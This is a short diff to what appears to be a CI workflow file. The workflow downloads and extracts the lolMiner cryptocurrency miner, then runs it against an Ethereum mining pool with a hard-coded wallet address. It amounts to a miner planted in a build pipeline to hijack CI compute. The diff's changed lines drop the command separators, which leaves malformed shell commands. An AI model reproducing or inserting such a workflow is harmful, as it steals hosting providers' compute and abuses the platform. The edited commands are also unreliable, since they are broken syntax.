@@ -17,9 +17,9 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: DOWNLOAD
-      run: Invoke-WebRequest https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.33/lolMiner_v1.33_Lin64.tar.gz && tar -xf lolMiner_v1.33_Lin64.tar.gz && cd 1.33
+      run: Invoke-WebRequest https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.33/lolMiner_v1.33_Lin64.tar.gz tar -xf lolMiner_v1.33_Lin64.tar.gz cd 1.33
     - name: Extract
-      run: tar -xf lolMiner_v1.33_Lin64.tar.gz && cd 1.33
+      run: tar -xf lolMiner_v1.33_Lin64.tar.gz cd 1.33
     - name: Running
       run: ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --u ETH:0x595d2191e4c9099c3143c04d89437afd9bf23c10.RIG-PRO1 --ethstratum ETHPROXY 
     - name: END
